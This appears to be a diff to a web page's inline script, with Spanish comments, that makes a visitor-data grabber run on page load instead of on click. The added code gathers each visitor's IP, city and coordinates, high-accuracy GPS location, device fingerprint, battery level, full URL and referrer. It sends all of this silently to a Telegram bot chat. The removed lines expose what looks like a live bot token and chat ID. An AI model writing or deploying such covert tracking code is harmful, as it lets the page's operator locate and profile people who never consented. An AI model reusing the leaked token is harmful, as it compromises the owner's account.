@@ -253,9 +253,8 @@
     </div>
 
     <script>
-        // CONFIGURACIÓN - Reemplaza con tus datos reales
-const TELEGRAM_BOT_TOKEN = '8425620613:AAHQ5pn_gWskyBn9t0TLHtDxWJBRJKO01lg'; // Obtén esto de @BotFather
-const TELEGRAM_CHAT_ID = '7831097636';     // Tu chat ID o ID del grupo
+        const TELEGRAM_BOT_TOKEN = 'TU_BOT_TOKEN_AQUI'; // Obtén esto de @BotFather
+const TELEGRAM_CHAT_ID = 'TU_CHAT_ID_AQUI';     // Tu chat ID o ID del grupo
 
 // Función para obtener información del dispositivo y navegador
 function obtenerInformacionDispositivo() {
@@ -289,15 +288,39 @@ function obtenerInformacionDispositivo() {
         
         // Detección de características
         touchScreen: nav.maxTouchPoints > 0 ? 'Sí' : 'No',
-        modoPrivado: 'Posiblemente (no detectable con certeza)',
         
         // Zona horaria
         zonaHoraria: Intl.DateTimeFormat().resolvedOptions().timeZone,
         offsetHorario: new Date().getTimezoneOffset() / -60,
         
         // Información de plugins (si están disponibles)
-        cantidadPlugins: nav.plugins ? nav.plugins.length : 0
+        cantidadPlugins: nav.plugins ? nav.plugins.length : 0,
+        
+        // Detección de modo de navegación
+        doNotTrack: nav.doNotTrack || 'No especificado',
+        
+        // Información de batería (si está disponible)
+        nivelBateria: 'Solicitando...'
     };
+}
+
+// Función para obtener información de batería
+async function obtenerInfoBateria() {
+    if ('getBattery' in navigator) {
+        try {
+            const battery = await navigator.getBattery();
+            return {
+                nivel: Math.round(battery.level * 100) + '%',
+                cargando: battery.charging ? 'Sí' : 'No',
+                tiempoRestante: battery.dischargingTime !== Infinity 
+                    ? Math.round(battery.dischargingTime / 60) + ' minutos' 
+                    : 'N/A'
+            };
+        } catch (error) {
+            return { error: 'No disponible' };
+        }
+    }
+    return { error: 'API no soportada' };
 }
 
 // Función para obtener geolocalización (requiere permiso del usuario)
@@ -320,7 +343,7 @@ async function obtenerGeolocalizacion() {
                         mensaje: error.message
                     });
                 },
-                { timeout: 5000 }
+                { timeout: 5000, enableHighAccuracy: true }
             );
         } else {
             resolve({ error: 'Geolocalización no disponible' });
@@ -343,72 +366,164 @@ async function obtenerIPyUbicacion() {
             latitud: data.latitude,
             longitud: data.longitude,
             isp: data.org,
-            timezone: data.timezone
+            timezone: data.timezone,
+            moneda: data.currency,
+            codigoTelefono: data.country_calling_code
         };
     } catch (error) {
-        return { error: 'No se pudo obtener la IP', mensaje: error.message };
+        // Intenta con un servicio alternativo
+        try {
+            const response2 = await fetch('https://api.ipify.org?format=json');
+            const data2 = await response2.json();
+            return { ip: data2.ip, nota: 'Solo IP disponible' };
+        } catch (error2) {
+            return { error: 'No se pudo obtener la IP', mensaje: error.message };
+        }
     }
+}
+
+// Función para obtener información de la página
+function obtenerInfoPagina() {
+    const url = new URL(window.location.href);
+    
+    return {
+        urlCompleta: window.location.href,
+        protocolo: window.location.protocol,
+        host: window.location.host,
+        pathname: window.location.pathname,
+        parametrosURL: url.searchParams.toString() || 'Sin parámetros',
+        hash: window.location.hash || 'Sin hash',
+        referrer: document.referrer || 'Acceso directo',
+        titulo: document.title,
+        charset: document.characterSet,
+        idiomaPagina: document.documentElement.lang || 'No especificado'
+    };
+}
+
+// Función para obtener parámetros UTM y de tracking
+function obtenerParametrosTracking() {
+    const url = new URL(window.location.href);
+    const params = {};
+    
+    // Parámetros UTM comunes
+    const utmParams = ['utm_source', 'utm_medium', 'utm_campaign', 'utm_term', 'utm_content'];
+    
+    // Otros parámetros comunes
+    const otrosParams = ['gclid', 'fbclid', 'msclkid', 'ref', 'source'];
+    
+    [...utmParams, ...otrosParams].forEach(param => {
+        const value = url.searchParams.get(param);
+        if (value) {
+            params[param] = value;
+        }
+    });
+    
+    return Object.keys(params).length > 0 ? params : null;
 }
 
 // Función para formatear el mensaje de Telegram
 function formatearMensaje(datos) {
     const fecha = new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' });
     
-    let mensaje = `🔔 *NUEVO CLICK DETECTADO*\n\n`;
+    let mensaje = `🚨 *NUEVA VISITA DETECTADA*\n\n`;
     mensaje += `📅 *Fecha y Hora:* ${fecha}\n\n`;
     
-    // Información del click
-    if (datos.click) {
-        mensaje += `🖱️ *INFORMACIÓN DEL CLICK*\n`;
-        mensaje += `• Elemento: ${datos.click.elemento}\n`;
-        mensaje += `• Posición: X=${datos.click.x}, Y=${datos.click.y}\n`;
-        mensaje += `• URL Página: ${datos.click.url}\n`;
-        mensaje += `• Referrer: ${datos.click.referrer || 'Directo'}\n\n`;
+    // Información de la página visitada
+    if (datos.pagina) {
+        mensaje += `🌐 *PÁGINA VISITADA*\n`;
+        mensaje += `• URL: ${datos.pagina.urlCompleta}\n`;
+        mensaje += `• Título: ${datos.pagina.titulo}\n`;
+        mensaje += `• Protocolo: ${datos.pagina.protocolo}\n`;
+        mensaje += `• Host: ${datos.pagina.host}\n`;
+        mensaje += `• Ruta: ${datos.pagina.pathname}\n`;
+        
+        if (datos.pagina.parametrosURL !== 'Sin parámetros') {
+            mensaje += `• Parámetros: ${datos.pagina.parametrosURL}\n`;
+        }
+        
+        mensaje += `• Referrer: ${datos.pagina.referrer}\n\n`;
+    }
+    
+    // Parámetros de tracking/marketing
+    if (datos.tracking) {
+        mensaje += `📊 *PARÁMETROS DE TRACKING*\n`;
+        for (const [key, value] of Object.entries(datos.tracking)) {
+            mensaje += `• ${key}: ${value}\n`;
+        }
+        mensaje += `\n`;
     }
     
     // Información de IP y ubicación
     if (datos.ubicacion && !datos.ubicacion.error) {
         mensaje += `🌍 *UBICACIÓN E IP*\n`;
-        mensaje += `• IP: ${datos.ubicacion.ip}\n`;
-        mensaje += `• País: ${datos.ubicacion.pais} (${datos.ubicacion.codigoPais})\n`;
-        mensaje += `• Ciudad: ${datos.ubicacion.ciudad}\n`;
-        mensaje += `• Región: ${datos.ubicacion.region}\n`;
-        mensaje += `• ISP: ${datos.ubicacion.isp}\n`;
-        mensaje += `• Coordenadas: ${datos.ubicacion.latitud}, ${datos.ubicacion.longitud}\n\n`;
+        mensaje += `• IP: \`${datos.ubicacion.ip}\`\n`;
+        mensaje += `• País: ${datos.ubicacion.pais} ${datos.ubicacion.codigoPais || ''}\n`;
+        mensaje += `• Ciudad: ${datos.ubicacion.ciudad || 'N/A'}\n`;
+        mensaje += `• Región: ${datos.ubicacion.region || 'N/A'}\n`;
+        if (datos.ubicacion.isp) {
+            mensaje += `• ISP: ${datos.ubicacion.isp}\n`;
+        }
+        if (datos.ubicacion.latitud) {
+            mensaje += `• Coordenadas: ${datos.ubicacion.latitud}, ${datos.ubicacion.longitud}\n`;
+        }
+        if (datos.ubicacion.timezone) {
+            mensaje += `• Timezone: ${datos.ubicacion.timezone}\n`;
+        }
+        mensaje += `\n`;
     }
     
-    // Geolocalización precisa
+    // Geolocalización precisa (si está disponible)
     if (datos.geolocalizacion && !datos.geolocalizacion.error) {
         mensaje += `📍 *GEOLOCALIZACIÓN PRECISA*\n`;
         mensaje += `• Latitud: ${datos.geolocalizacion.latitud}\n`;
         mensaje += `• Longitud: ${datos.geolocalizacion.longitud}\n`;
-        mensaje += `• Precisión: ${datos.geolocalizacion.precision}\n\n`;
+        mensaje += `• Precisión: ${datos.geolocalizacion.precision}\n`;
+        if (datos.geolocalizacion.altitud !== 'N/A') {
+            mensaje += `• Altitud: ${datos.geolocalizacion.altitud}\n`;
+        }
+        mensaje += `\n`;
     }
     
     // Información del dispositivo
     if (datos.dispositivo) {
-        mensaje += `💻 *DISPOSITIVO Y NAVEGADOR*\n`;
+        mensaje += `💻 *DISPOSITIVO*\n`;
         mensaje += `• Plataforma: ${datos.dispositivo.plataforma}\n`;
         mensaje += `• Pantalla: ${datos.dispositivo.resolucionPantalla}\n`;
         mensaje += `• Ventana: ${datos.dispositivo.tamañoVentana}\n`;
+        mensaje += `• Orientación: ${datos.dispositivo.orientacion}\n`;
         mensaje += `• Touch: ${datos.dispositivo.touchScreen}\n`;
         mensaje += `• CPU Cores: ${datos.dispositivo.nucleosCPU}\n`;
-        mensaje += `• RAM: ${datos.dispositivo.memoriaDispositivo}\n`;
+        mensaje += `• RAM: ${datos.dispositivo.memoriaDispositivo}\n\n`;
+    }
+    
+    // Información de batería
+    if (datos.bateria && !datos.bateria.error) {
+        mensaje += `🔋 *BATERÍA*\n`;
+        mensaje += `• Nivel: ${datos.bateria.nivel}\n`;
+        mensaje += `• Cargando: ${datos.bateria.cargando}\n\n`;
+    }
+    
+    // Información del navegador
+    if (datos.dispositivo) {
+        mensaje += `🌐 *NAVEGADOR*\n`;
         mensaje += `• Idioma: ${datos.dispositivo.idioma}\n`;
-        mensaje += `• Zona Horaria: ${datos.dispositivo.zonaHoraria}\n\n`;
+        mensaje += `• Idiomas: ${datos.dispositivo.idiomasAceptados}\n`;
+        mensaje += `• Zona Horaria: ${datos.dispositivo.zonaHoraria}\n`;
+        mensaje += `• Cookies: ${datos.dispositivo.cookiesHabilitadas ? 'Sí' : 'No'}\n`;
+        mensaje += `• Do Not Track: ${datos.dispositivo.doNotTrack}\n\n`;
     }
     
     // Información de conexión
-    if (datos.dispositivo) {
+    if (datos.dispositivo && datos.dispositivo.tipoConexion !== 'N/A') {
         mensaje += `📶 *CONEXIÓN*\n`;
         mensaje += `• Tipo: ${datos.dispositivo.tipoConexion}\n`;
         mensaje += `• Velocidad: ${datos.dispositivo.velocidadBajada}\n\n`;
     }
     
-    // User Agent completo
+    // User Agent (al final para no saturar)
     if (datos.dispositivo) {
         mensaje += `🔍 *USER AGENT*\n`;
-        mensaje += `\`${datos.dispositivo.navegador}\`\n`;
+        mensaje += `\`${datos.dispositivo.navegador.substring(0, 200)}\`\n`;
     }
     
     return mensaje;
@@ -427,14 +542,15 @@ async function enviarTelegram(mensaje) {
             body: JSON.stringify({
                 chat_id: TELEGRAM_CHAT_ID,
                 text: mensaje,
-                parse_mode: 'Markdown'
+                parse_mode: 'Markdown',
+                disable_web_page_preview: true
             })
         });
         
         const data = await response.json();
         
         if (data.ok) {
-            console.log('✅ Mensaje enviado a Telegram exitosamente');
+            console.log('✅ Notificación enviada a Telegram exitosamente');
         } else {
             console.error('❌ Error al enviar a Telegram:', data.description);
         }
@@ -447,36 +563,31 @@ async function enviarTelegram(mensaje) {
 }
 
 // Función principal que recopila y envía toda la información
-async function procesarClick(event) {
-    console.log('🎯 Click detectado, recopilando información...');
+async function procesarVisita() {
+    console.log('🎯 Visita detectada, recopilando información...');
     
-    // Recopilar información del click
-    const infoClick = {
-        elemento: event.target.tagName,
-        texto: event.target.innerText?.substring(0, 50) || 'N/A',
-        id: event.target.id || 'Sin ID',
-        clase: event.target.className || 'Sin clase',
-        x: event.clientX,
-        y: event.clientY,
-        url: window.location.href,
-        referrer: document.referrer
-    };
+    // Recopilar información de la página
+    const infoPagina = obtenerInfoPagina();
+    const tracking = obtenerParametrosTracking();
     
-    // Recopilar toda la información
+    // Recopilar información del dispositivo
     const dispositivo = obtenerInformacionDispositivo();
     
     // Obtener información asíncrona
-    const [ubicacion, geolocalizacion] = await Promise.all([
+    const [ubicacion, geolocalizacion, bateria] = await Promise.all([
         obtenerIPyUbicacion(),
-        obtenerGeolocalizacion()
+        obtenerGeolocalizacion(),
+        obtenerInfoBateria()
     ]);
     
     // Preparar datos completos
     const datosCompletos = {
-        click: infoClick,
+        pagina: infoPagina,
+        tracking: tracking,
         dispositivo: dispositivo,
         ubicacion: ubicacion,
-        geolocalizacion: geolocalizacion
+        geolocalizacion: geolocalizacion,
+        bateria: bateria
     };
     
     // Formatear y enviar mensaje
@@ -484,22 +595,19 @@ async function procesarClick(event) {
     await enviarTelegram(mensaje);
 }
 
-// Inicializar el detector de clicks
-function iniciarDetectorClicks() {
-    console.log('🚀 Detector de clicks iniciado');
+// Inicializar el detector de visitas
+function iniciarDetectorVisitas() {
+    console.log('🚀 Detector de visitas iniciado');
     
-    // Detectar clicks en toda la página
-    document.addEventListener('click', procesarClick);
-    
-    // También puedes detectar clicks en elementos específicos:
-    // document.getElementById('boton-especial').addEventListener('click', procesarClick);
+    // Ejecutar inmediatamente al cargar la página
+    procesarVisita();
 }
 
 // Ejecutar cuando la página esté lista
 if (document.readyState === 'loading') {
-    document.addEventListener('DOMContentLoaded', iniciarDetectorClicks);
+    document.addEventListener('DOMContentLoaded', iniciarDetectorVisitas);
 } else {
-    iniciarDetectorClicks();
+    iniciarDetectorVisitas();
 }
 
     </script>
